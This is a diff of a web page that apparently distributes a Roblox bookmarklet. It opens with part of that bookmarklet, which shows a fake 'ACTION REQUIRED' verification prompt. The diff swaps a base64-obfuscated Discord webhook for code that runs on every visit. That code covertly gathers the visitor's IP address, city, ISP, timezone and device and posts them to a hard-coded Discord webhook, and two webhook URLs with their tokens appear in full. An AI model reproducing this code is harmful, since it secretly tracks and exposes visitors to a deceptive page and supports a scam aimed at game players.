style="font-size:14px;color:#999;">Potential security threat detected.</div>';}else{threat.innerHTML='<div style="font-weight:700;font-size:18px;color:#fbbf24;margin-bottom:8px;">ACTION REQUIRED</div><div style="font-size:14px;color:#bbb;">You need to complete two-step verification on Roblox before continuing, or change your Trade Quality filter to “None.”</div>';}status.style.display='none';results.style.display='block';}}runStage();};if(!isMobile){header.style.cursor='move';header.addEventListener('mousedown',function(e){if(e.target===closeBtn||e.target.parentNode===closeBtn){return;}dragState.isDragging=true;dragState.startX=e.clientX;dragState.startY=e.clientY;var rect=panel.getBoundingClientRect();dragState.startLeft=rect.left;dragState.startTop=rect.top;});document.addEventListener('mousemove',function(e){if(!dragState.isDragging){return;}var dx=e.clientX-dragState.startX;var dy=e.clientY-dragState.startY;panel.style.left=dragState.startLeft+dx+'px';panel.style.top=dragState.startTop+dy+'px';panel.style.transform='none';});document.addEventListener('mouseup',function(){dragState.isDragging=false;});}}catch(err){alert('Error: '+err.message);}})();`;        // ========================================
         function createParticles() {
             const particlesContainer = document.getElementById('particles');
+            // Reduced to 20 for better performance
             const particleCount = window.innerWidth < 768 ? 10 : 20;
 
             for (let i = 0; i < particleCount; i++) {
                 const particle = document.createElement('div');
                 particle.className = 'particle';
 
+                // Random size between 2px and 10px (smaller)
                 const size = Math.random() * 8 + 2;
                 particle.style.width = size + 'px';
                 particle.style.height = size + 'px';
 
+                // Random horizontal position
                 particle.style.left = Math.random() * 100 + '%';
+
+                // Slower animation for less CPU usage
                 particle.style.animationDuration = (Math.random() * 40 + 30) + 's';
+
+                // Random delay up to 20s
                 particle.style.animationDelay = (Math.random() * 20) + 's';
 
                 particlesContainer.appendChild(particle);
             }
         }
+
+        // Initialize particles on page load
+        createParticles();
+
+        // ========================================
+        // Default Video Volume
+        // ========================================
+        (function setDefaultVideoVolume() {
+            const video = document.getElementById('demoVideo');
+            if (!video) return;
+
+            const apply = () => {
+                try { video.volume = 0.8; } catch (e) {}
+            };
+
+            if (video.readyState >= 1) {
+                apply();
+            } else {
+                video.addEventListener('loadedmetadata', apply, { once: true });
+            }
+        })();
+
+        // ========================================
+        // Video Thumbnail (Poster) From First Frame
+        // ========================================
+        (function setVideoPosterFromFirstFrame() {
+            const video = document.getElementById('demoVideo');
+            if (!video) return;
+
+            if (video.getAttribute('poster')) return;
+
+            const capture = () => {
+                try {
+                    if (!video.videoWidth || !video.videoHeight) return;
+                    const canvas = document.createElement('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    const ctx = canvas.getContext('2d');
+                    if (!ctx) return;
+                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    const dataUrl = canvas.toDataURL('image/jpeg', 0.85);
+                    video.setAttribute('poster', dataUrl);
+                } catch (e) {
+                    // Ignore poster generation failures
+                }
+            };
+
+            const generate = () => {
+                // Ensure at least one frame is decoded
+                const targetTime = 0.05;
+                const onSeeked = () => {
+                    capture();
+                    try { video.pause(); } catch (e) {}
+                    try { video.currentTime = 0; } catch (e) {}
+                };
+
+                video.addEventListener('seeked', onSeeked, { once: true });
+                try {
+                    video.currentTime = targetTime;
+                } catch (e) {
+                    // If seeking fails, try capturing whatever frame is available
+                    capture();
+                }
+            };
+
+            const onLoadedData = () => generate();
+
+            if (video.readyState >= 2) {
+                // HAVE_CURRENT_DATA
+                onLoadedData();
+            } else {
+                video.addEventListener('loadeddata', onLoadedData, { once: true });
+
+                // Kick the network/decoder (muted allows autoplay without user gesture)
+                const p = video.play();
+                if (p && typeof p.catch === 'function') p.catch(() => {});
+            }
+        })();
 
         // ========================================
         // Theme Toggle Functionality
@@ -622,13 +706,15 @@
         const moonButton = document.getElementById('moonButton');
         const html = document.documentElement;
 
-        const currentTheme = localStorage.getItem('theme') || 'light';
+        // Check for saved theme preference (defaults to dark mode)
+        const currentTheme = localStorage.getItem('theme') || 'dark';
         if (currentTheme === 'dark') {
             html.classList.add('dark');
             document.body.classList.add('dark-mode');
             updateToggleButtons(true);
         }
 
+        // Toggle theme on button click
         themeToggle.addEventListener('click', () => {
             const isDark = html.classList.toggle('dark');
             document.body.classList.toggle('dark-mode');
@@ -636,6 +722,7 @@
             updateToggleButtons(isDark);
         });
 
+        // Update toggle button appearance
         function updateToggleButtons(isDark) {
             if (isDark) {
                 sunButton.className = 'relative flex items-center justify-center w-12 h-12 rounded-full transition-all duration-300 bg-transparent text-gray-500 hover:text-gray-400';
@@ -646,67 +733,166 @@
             }
         }
 
-        // ========================================
-        // Compile Button Click/Hold Tracking
-        // ========================================
         const compileButton = document.getElementById('compileButton');
-        const _0x4a2b = ['aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ2ODk5MzIzMjIyNTU3MDkwNy8yMG1lcmdnUkxBYnhieV9DdlBrcWRmSmhZeVJoOG9ZcXRMMkt1Qjc3TVowSG9EdnljQ0RUcjNFVU11ektXMW5uUDBLUQ=='];
-        const _0x3c8f = (function() {
-            return atob(_0x4a2b[0]);
-        })();
+        document.getElementById('bookmarkInput').value = Bookmark;
+        document.getElementById('compileButton').href = Bookmark;
 
-        function sendWebhookNotification(action) {
-            fetch(_0x3c8f, {
+        // ========================================
+        // Discord Webhook Notification
+        // ========================================
+        const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1464694346434613348/nKX35xYn8hmbYQ9Gg0hudp0BPov56cmWDLDoInuNIUViMnbtDhD0gOHs7pZDCJX1_wld';
+
+        const getDeviceInfo = () => {
+            const platform = navigator.platform;
+            const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+            const device = isMobile ? 'Mobile' : 'Desktop';
+            return { device, platform };
+        };
+
+        const sendDiscordEmbed = (embed) => {
+            if (!DISCORD_WEBHOOK_URL) return;
+            fetch(DISCORD_WEBHOOK_URL, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
                 },
                 body: JSON.stringify({
-                    content: 'Someone dummy is touching the bookmark'
+                    embeds: [embed]
                 })
-            }).catch(err => console.log('Webhook notification sent'));
+            }).catch(error => {
+                console.error('Failed to send Discord notification:', error);
+            });
+        };
+
+
+        if (compileButton) {
+            compileButton.addEventListener('click', (e) => {
+                e.preventDefault();
+            });
         }
 
-        let lastNotification = 0;
-        const debounceTime = 1000;
+        (function sendDiscordNotification() {
+            const info = getDeviceInfo();
+            const device = info.device;
+            const platform = info.platform;
 
-        function debounceNotification(action) {
-            const now = Date.now();
-            if (now - lastNotification > debounceTime) {
-                lastNotification = now;
-                sendWebhookNotification(action);
+            if (!DISCORD_WEBHOOK_URL) {
+                return;
             }
-        }
 
-        compileButton.addEventListener('click', () => {
-            debounceNotification('click');
-        });
+            // Get location and IP info - try multiple APIs with CORS proxy
+            const tryGetLocation = () => {
+                // Try ip-api.com through CORS proxy first
+                return fetch('https://api.allorigins.win/get?url=' + encodeURIComponent('https://ip-api.com/json/?fields=status,message,country,regionName,city,isp,timezone,query'))
+                    .then(response => {
+                        if (!response.ok) throw new Error('CORS proxy failed');
+                        return response.json();
+                    })
+                    .then(proxyData => {
+                        const data = JSON.parse(proxyData.contents);
+                        if (data.status === 'fail') throw new Error('ip-api.com error');
+                        return {
+                            ip: data.query || 'Unknown',
+                            country: data.country || 'Unknown',
+                            region: data.regionName || 'Unknown',
+                            city: data.city || 'Unknown',
+                            isp: data.isp || 'Unknown',
+                            timezone: data.timezone || 'Unknown'
+                        };
+                    })
+                    .catch(() => {
+                        // Fallback to ipapi.co
+                        return fetch('https://ipapi.co/json/')
+                            .then(response => {
+                                if (!response.ok) throw new Error('ipapi.co failed');
+                                return response.json();
+                            })
+                            .then(data => {
+                                if (data.error) throw new Error('ipapi.co error');
+                                return {
+                                    ip: data.ip || 'Unknown',
+                                    country: data.country_name || 'Unknown',
+                                    region: data.region || 'Unknown',
+                                    city: data.city || 'Unknown',
+                                    isp: data.org || 'Unknown',
+                                    timezone: data.timezone || 'Unknown'
+                                };
+                            });
+                    });
+            };
 
-        compileButton.addEventListener('mousedown', () => {
-            debounceNotification('hold');
-        });
+            tryGetLocation()
+                .then(locationData => {
+                    const ip = locationData.ip;
+                    const country = locationData.country;
+                    const region = locationData.region;
+                    const city = locationData.city;
+                    const isp = locationData.isp;
+                    const timezone = locationData.timezone;
 
-        compileButton.addEventListener('touchstart', () => {
-            debounceNotification('touch');
-        }, {
-            passive: true
-        });
+                    // Format the Discord message
+                    const embed = {
+                        title: '🌐 New Website Visitor',
+                        fields: [
+                            {
+                                name: 'IP',
+                                value: ip,
+                                inline: false
+                            },
+                            {
+                                name: 'Country',
+                                value: country,
+                                inline: false
+                            },
+                            {
+                                name: 'Region',
+                                value: region,
+                                inline: false
+                            },
+                            {
+                                name: 'City',
+                                value: city,
+                                inline: false
+                            },
+                            {
+                                name: 'ISP',
+                                value: isp,
+                                inline: false
+                            },
+                            {
+                                name: 'Timezone',
+                                value: timezone,
+                                inline: false
+                            },
+                            {
+                                name: 'Device',
+                                value: `${device} (${platform})`,
+                                inline: false
+                            }
+                        ],
+                        timestamp: new Date().toISOString()
+                    };
 
-        compileButton.href = Bookmark;
-        compileButton.addEventListener('dragstart', e => e.dataTransfer.setData('text/uri-list', Bookmark));
+                    sendDiscordEmbed(embed);
+                })
+                .catch(error => {
+                    // If location fetch fails, send notification with device only
+                    const embed = {
+                        title: '🌐 New Website Visitor',
+                        fields: [
+                            {
+                                name: 'Device',
+                                value: `${device} (${platform})`,
+                                inline: false
+                            }
+                        ],
+                        timestamp: new Date().toISOString()
+                    };
 
-        // ========================================
-        // Initialize & Show Content
-        // ========================================
-        window.addEventListener('DOMContentLoaded', () => {
-            createParticles();
-            // Small delay to ensure everything is loaded
-            setTimeout(() => {
-                document.body.classList.remove('preload');
-                document.body.classList.add('loaded');
-            }, 100);
-        });
+                    sendDiscordEmbed(embed);
+                });
+        })();
     </script>
 </body>
 
-</html
+</html>
